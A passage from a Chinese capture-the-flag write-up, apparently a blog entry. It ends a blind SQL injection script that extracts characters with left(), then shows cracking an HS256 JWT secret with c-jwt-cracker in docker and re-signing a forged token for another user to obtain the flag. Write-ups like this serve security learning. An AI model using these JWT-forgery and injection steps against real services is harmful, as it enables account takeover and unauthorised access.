print('Baned!')\n            exit()\n```\n\n脚本核心使用left函数对select到的内容进行截取，通过遍历的方式匹配到正确的字符。\n\n# 三体信息破译\n\n注册账号，在burp中能够看到cookie为jwt格式，在头部中可以看到加密方式为hs256，考虑进行暴力破解（没想到真能破解出来），使用工具c-jwt-cracker进行破解，docker运行\n\n```docker\ndocker run -it --rm jwtcrack [完整的jwt格式的一个样本]\n```\n\n得到密码为**izihz**\n\n登陆后会看到一长串关于网络安全的定义，很长所以很容易被人忽略（多用ctrl+f搜索一下关键词例如flag、hint之类，很有可能藏在看似无用的内容中），发现hint为使用用户名为“yewenjie”的用户进行登录，而jwt中有用户名字段：\n\n![JWT内容](./image-20230402210218768.png)\n\n将username改为yewenjie后利用破解出的密钥重新生成签名登录即可获得flag。\n\n## 写在最后：\n\n真的菜，差距真的大，多参加比赛，多刷题！\n\n","tags":["CTF_比赛记录"]}]